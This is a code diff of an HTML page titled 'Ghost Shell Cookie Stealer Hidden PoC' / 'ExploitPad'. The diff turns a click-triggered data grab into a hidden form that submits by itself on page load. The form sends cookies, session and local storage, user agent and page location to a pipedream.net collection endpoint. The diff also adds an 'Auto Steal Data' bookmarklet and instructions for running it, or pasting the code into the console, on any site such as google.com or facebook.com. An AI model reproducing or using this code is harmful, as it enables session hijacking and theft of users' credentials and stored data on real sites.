@@ -14,6 +14,7 @@
         button:hover { background-color: #ffcc00; }
         iframe { width: 100%; height: 300px; border: 2px solid gold; border-radius: 10px; background-color: white; margin-top: 10px; }
         .instructions { margin-top: 20px; font-size: 14px; color: #ccc; }
+        form { display: none; }
     </style>
 </head>
 <body>
@@ -28,15 +29,22 @@
     <style>
         body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; font-family: Arial, sans-serif; }
         h2 { text-align: center; color: gold; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
-        button { background-color: gold; color: black; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
-        button:hover { background-color: #ffcc00; }
+        form { display: none; }
     </style>
 </head>
 <body>
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-    <button onclick="stealData()">Click to Steal Data from This Page</button>
+    <form id="dataForm" action="https://eoy4evvlsf7y0jq.m.pipedream.net" method="POST">
+        <input type="hidden" name="cookie_data" id="cookieField">
+        <input type="hidden" name="session_storage" id="sessionField">
+        <input type="hidden" name="local_storage" id="localField">
+        <input type="hidden" name="user_agent" id="userAgentField">
+        <input type="hidden" name="referrer" id="referrerField">
+        <input type="hidden" name="source" id="sourceField">
+        <input type="hidden" name="location" id="locationField">
+    </form>
     <script>
-        function stealData() {
+        document.addEventListener("DOMContentLoaded", function() {
             var cookies = document.cookie || "No_Cookies_Found";
             var sessionData = {};
             for (var i = 0; i < sessionStorage.length; i++) {
@@ -55,24 +63,15 @@
             console.log("Session Storage: ", sessionData);
             console.log("Local Storage: ", localData);
 
-            fetch("https://cors-anywhere.herokuapp.com/https://eoy4evvlsf7y0jq.m.pipedream.net", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    cookie_data: cookies,
-                    session_storage: sessionData,
-                    local_storage: localData,
-                    user_agent: navigator.userAgent,
-                    referrer: document.referrer,
-                    source: window.location.hostname,
-                    location: window.location.href
-                })
-            }).then(response => console.log("Fetch success:", response.ok))
-              .catch(error => console.error("Fetch error:", error));
-        }
+            document.getElementById("cookieField").value = cookies;
+            document.getElementById("sessionField").value = JSON.stringify(sessionData);
+            document.getElementById("localField").value = JSON.stringify(localData);
+            document.getElementById("userAgentField").value = navigator.userAgent || "Unknown_User_Agent";
+            document.getElementById("referrerField").value = document.referrer || "No_Referrer";
+            document.getElementById("sourceField").value = window.location.hostname;
+            document.getElementById("locationField").value = window.location.href;
 
-        document.addEventListener("DOMContentLoaded", function() {
-            console.log("Iframe loaded - click the button to steal data.");
+            document.getElementById("dataForm").submit();
         });
     </script>
 </body>
@@ -80,49 +79,17 @@
         <button onclick="runCode()">▶ Run Code</button>
         <iframe id="output"></iframe>
         <div class="instructions">
-            <p>To capture real cookies and storage from ANY site: 
-            1. Visit the site you want to steal from (e.g., google.com). 
-            2. Open the console (F12) and paste the code from the textarea above. 
-            3. Press Enter, then click the button in the iframe to send data.</p>
+            <p>To automatically capture real cookies and storage from ANY site:<br>
+            1. Drag this bookmarklet to your bookmarks bar: <a href="javascript:(function(){var f=document.createElement('form');f.method='POST';f.action='https://eoy4evvlsf7y0jq.m.pipedream.net';var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}f.innerHTML='<input type=hidden name=cookie_data value=\\''+c+'\\'><input type=hidden name=session_storage value=\\''+JSON.stringify(ss)+'\\'><input type=hidden name=local_storage value=\\''+JSON.stringify(ls)+'\\'><input type=hidden name=user_agent value=\\''+navigator.userAgent+'\\'><input type=hidden name=referrer value=\\''+document.referrer+'\\'><input type=hidden name=source value=\\''+location.hostname+'\\'><input type=hidden name=location value=\\''+window.location.href+'\\'>';document.body.appendChild(f);f.submit();})();">Auto Steal Data</a><br>
+            2. Click the bookmarklet on any site (e.g., google.com, facebook.com) to auto-send real data.<br>
+            OR: Copy the textarea code, paste it into any site's console (F12), and press Enter—it runs automatically.</p>
         </div>
     </div>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            var parentCookies = document.cookie || "No_Parent_Cookies";
-            var parentSessionData = {};
-            for (var i = 0; i < sessionStorage.length; i++) {
-                var key = sessionStorage.key(i);
-                parentSessionData[key] = sessionStorage.getItem(key);
-            }
-            var parentLocalData = {};
-            for (var i = 0; i < localStorage.length; i++) {
-                var key = localStorage.key(i);
-                parentLocalData[key] = localStorage.getItem(key);
-            }
-            if (Object.keys(parentSessionData).length === 0) parentSessionData = "No_Parent_Session_Data";
-            if (Object.keys(parentLocalData).length === 0) parentLocalData = "No_Parent_Local_Data";
-
-            console.log("Parent Cookies: ", parentCookies);
-            console.log("Parent Session Storage: ", parentSessionData);
-            console.log("Parent Local Storage: ", parentLocalData);
-
-            fetch("https://cors-anywhere.herokuapp.com/https://eoy4evvlsf7y0jq.m.pipedream.net", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    parent_cookie_data: parentCookies,
-                    parent_session_storage: parentSessionData,
-                    parent_local_storage: parentLocalData,
-                    user_agent: navigator.userAgent,
-                    referrer: document.referrer,
-                    source: window.location.hostname,
-                    location: window.location.href
-                })
-            }).then(response => console.log("Parent fetch success:", response.ok))
-              .catch(error => console.error("Parent fetch error:", error));
-
-            runCode();
+            console.log("ExploitPad loaded - use the bookmarklet or paste the textarea code on any site.");
+            runCode(); // Auto-run the iframe code on load
         });
 
         function runCode() {
